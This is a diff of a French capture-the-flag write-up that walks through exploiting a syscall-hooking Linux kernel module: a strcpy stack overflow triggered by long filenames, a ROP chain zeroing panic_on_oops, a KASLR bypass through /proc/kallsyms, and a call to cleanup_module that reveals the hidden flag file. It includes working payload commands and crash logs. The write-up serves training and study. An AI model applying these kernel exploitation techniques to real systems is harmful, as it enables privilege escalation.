@@ -10,21 +10,19 @@ tags:
 
 # I - Intro
 
-Le challenge se compose d'un module Linux pour un kernel `4.14.167 amd64`. Celui-ci est chargé automatiquement dans une VM Qemu accessible via une connexion ssh sur la machine hôte.
+Le challenge se compose d'un module Linux pour un kernel `4.14.167 amd64`. Celui-ci est chargé automatiquement dans une VM QEMU accessible via une connexion ssh sur la machine hôte.
 
-# II - Analyse statique et le buffer overflow
+# II - Analyse statique et découverte du buffer overflow
 
-Après une analyse statique du binaire avec *Ghidra*, nous remarquons que le module va modifier la table des syscalls et remplacer les syscalls `lstat`, `getdents` et `getdents64`.
-Ces versions modifiées des syscalls vont faire appel aux syscalls d'origine et modifier leur retour de manière à masquer les informations à propos des fichiers commençant par `ecsc_flag_`. Le but est donc de trouver un moyen de contourner cette restriction de manière à pouvoir lire le fichier contenant le flag à la racine de la machine.
+Après une analyse statique du binaire avec *Ghidra*, nous remarquons que le module va modifier la table des syscalls pour remplacer `lstat`, `getdents` et `getdents64`.
+Ces versions modifiées des syscalls vont faire appel a ceux d'origine et modifier leur retour de manière à masquer les informations à propos des fichiers commençant par `ecsc_flag_`. Le but est donc de trouver un moyen de contourner cette restriction de manière à pouvoir lire le fichier contenant le flag à la racine de la machine.
 
-Après analyse de la version modifiée des syscalls, quelque chose de plutôt important est visible dans `ecsc_sys_getdents` et `ecsc_sys_getdents64`. Lorsque le module va lire ou écrire les noms des fichiers qu'il traite, il utilise la fonction `strcpy` ne possédant pas de protection contre une attaque de type *buffer overflow*. Comme le module ne possède pas de protection à base de *stack cookie*, il est possible d'utiliser un nom de fichier tellement long que l'adresse de retour de la fonction soit modifié nous permettant donc d'exécuter n'importe quel code avec les privilèges du kernel.
+Après analyse de la version modifiée des syscalls, quelque chose de plutôt important est visible dans `ecsc_sys_getdents` et `ecsc_sys_getdents64`. Lorsque le module va lire ou écrire les noms des fichiers qu'il traite, il utilise la fonction `strcpy` qui ne possède pas de protection contre une attaque de type *buffer overflow*. Comme le module n'a pas de protection à base de *stack cookie*, il est possible d'utiliser un nom de fichier tellement long que l'adresse de retour de la fonction soit modifiée nous permettant donc d'exécuter n'importe quel code avec les privilèges du kernel.
 
-En utilisant un simple pattern, on peut facilement trouver quel caractère permet de contrôler `RIP` :
+En utilisant un simple pattern, on peut facilement trouver quels caractères permettent de contrôler `RIP` :
 
 ```
-~ $ touch ecsc_flag_Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8A
-c9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4A
-g5Ag
+~ $ touch ecsc_flag_Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 ~ $ ls
 general protection fault: 0000 [#1] NOPTI
 Modules linked in: ecsc(O)
@@ -47,29 +45,28 @@ RIP: 0x6441356441346441 RSP: ffffab2f4009ff38
 Segmentation fault
 ```
 
-`RIP` est donc contrôlé par le 102ème caractère.
+`RIP` est donc contrôlé par les caractères à partir du 102ème.
 
 # III - Création d'une *ROP chain* pour désactiver `oops=panic`
 
-L'un des principal problème rencontré est la présence de l'option `oops=panic` dans la ligne de commande du kernel, cette option provoque un kernel panic au moindre kernel oops or un kernel oops se produit lorsque quelque chose segfault dans le kernel mais que cela n'impactera pas complètement la stabilité du système. Il serait plutôt complexe de réussir à créer un exploit qui retourne dans un état stable sans provoquer un kernel oops, le plus simple reste donc de désactiver l'option `oops=panic` avant d'exécuter l'exploit final.
+L'un des principaux problèmes rencontré est la présence de l'option `oops=panic` dans la ligne de commande du kernel, cette option provoque un kernel panic au moindre kernel oops, ce qui se produit lorsque qu'un segfault dans le kernel n'impacte pas complètement la stabilité du système. Il serait plutôt complexe de réussir à créer un exploit qui retourne dans un état stable sans provoquer un kernel oops, le plus simple reste donc de désactiver l'option `oops=panic` avant d'exécuter l'exploit final.
 
 L'option `oops=panic` est représentée par la [variable globale `panic_on_oops`](https://elixir.bootlin.com/linux/v4.14.167/source/kernel/panic.c#L35), il faudrait donc construire une *ROP chain* permettant de mettre sa valeur à 0. Pour trouver les gadgets à utiliser il faut d'abord extraire le ELF original du kernel car celui-ci est compressé, ici en gzip, `binwalk` permet d'obtenir l'offset des données compressées puis `gunzip` permet de les décompresser.
 
-On peut ensuite utiliser *[ROPGadget](https://github.com/JonathanSalwan/ROPgadget)* pour trouver des gadgets intéressants, voici ceux que j'ai choisi :
+Nous pouvons ensuite utiliser *[ROPGadget](https://github.com/JonathanSalwan/ROPgadget)* pour trouver des gadgets intéressants, voici ceux que j'ai choisi :
 ```
 0xffffffff81269eee : pop rsi ; ret                                  [G1]
 0xffffffff8115fac8 : mov dword ptr [rsi], 0 ; xor eax, eax ; ret    [G2]
 ```
-Ils sont plutôt simple a utiliser et ont peux d'effets secondaires. On peut donc construire la *ROP chain* de cette manière :
+Ils sont plutôt simples à utiliser et ont peu d'effets secondaires. On peut donc construire la *ROP chain* de cette manière :
 ```py
-ropchain = (b"A" * 102) + struct.pack("Q", A_G1) + struct.pack("Q", A_oops) + struct.pack("Q", A_G2) + (b"I"
-* 8)
+ropchain = (b"A" * 102) + struct.pack("Q", A_G1) + struct.pack("Q", A_oops) + struct.pack("Q", A_G2) + (b"I" * 8)
 ```
 Il ne faut pas oublier de prendre en compte l'ASLR du kernel mais celle-ci peut être facilement contrée car ses symboles sont accessibles via `/proc/kallsyms`, il suffit alors de comparer l'adresse de `startup_64` exposée par `kallsyms` avec celle du ELF du kernel.
 
 # IV - Restauration des vrais syscalls
 
-Pour restaurer les vrais syscalls `lstat`, `getdents` et `getdents64`, la méthode la plus simple et d'appeler la fonction `cleanup_module` du module. Les symboles du module sont eux aussi exposés par `kallsyms`.
+Pour restaurer les vrais syscalls `lstat`, `getdents` et `getdents64`, la méthode la plus simple est d'appeler la fonction `cleanup_module` du module. Les symboles du module sont eux aussi exposés par `kallsyms`.
 
 En combinant ceci avec la *ROP chain* du paragraphe précédant, il est possible de retrouver le nom des fichiers commençant par `ecsc_flag_` :
 ```
@@ -84,9 +81,7 @@ ffffffff8fe00390 T __startup_secondary_64
 ffffffff8fe00398 t sanitize_boot_params.constprop.1
 ffffffff8fe00430 t run_init_process
 ffffffff8fe00460 t try_to_run_init_process
-~ $ touch "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAA\xee\x9e\x06\x90\xff\xff\xff\xff\xb8K\x91\x90\xff\xff\xff\xff\xc8\xfa\xf5\x8f\xff
-\xff\xff\xffIIIIIIII')"
+~ $ touch "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xee\x9e\x06\x90\xff\xff\xff\xff\xb8K\x91\x90\xff\xff\xff\xff\xc8\xfa\xf5\x8f\xff\xff\xff\xffIIIIIIII')"
 ~ $ ls
 general protection fault: 0000 [#1] NOPTI
 Modules linked in: ecsc(O)
@@ -108,9 +103,7 @@ Code:  Bad RIP value.
 RIP: 0x4949494949494949 RSP: ffffb9094009ff50
 ---[ end trace 7b7d593635ea5627 ]---
 Segmentation fault
-~ $ rm "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAA\xee\x9e\x06\x90\xff\xff\xff\xff\xb8K\x91\x90\xff\xff\xff\xff\xc8\xfa\xf5\x8f\xff\xff
-\xff\xffIIIIIIII')"
+~ $ rm "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xee\x9e\x06\x90\xff\xff\xff\xff\xb8K\x91\x90\xff\xff\xff\xff\xc8\xfa\xf5\x8f\xff\xff\xff\xffIIIIIIII')"
 ~ $ ls
 ~ $ cat /proc/kallsyms | grep ecsc
 ffffffffc01a82c8 b ref_sys_getdents64	[ecsc]
@@ -124,8 +117,7 @@ ffffffffc01a6150 t ecsc_sys_getdents	[ecsc]
 ffffffffc01a636e t cleanup_module	[ecsc]
 ffffffffc01a62a0 t ecsc_sys_lstat	[ecsc]
 ffffffffc01a6000 t ecsc_sys_getdents64	[ecsc]
-~ $ touch "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAnc\x1a\xc0\xff\xff\xff\xff')"
+~ $ touch "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnc\x1a\xc0\xff\xff\xff\xff')"
 ~ $ ls
 BUG: unable to handle kernel NULL pointer dereference at           (null)
 IP:           (null)
@@ -152,8 +144,7 @@ CR2: 0000000000000000
 ---[ end trace 7b7d593635ea5628 ]---
 Killed
 ~ $ ls
-ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAnc??????
+ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnc??????
 ~ $ cd ..
 /home $ ls
 ctf
@@ -173,7 +164,6 @@ run
 sys
 tmp
 var
-/ $ cat ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde21166761
-26
+/ $ cat ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde2116676126
 ECSC{c0d801fb2045ddb0ab27766e52b7654ccde41b5fc00d07fa908fefa30b45b8a5}
 ```
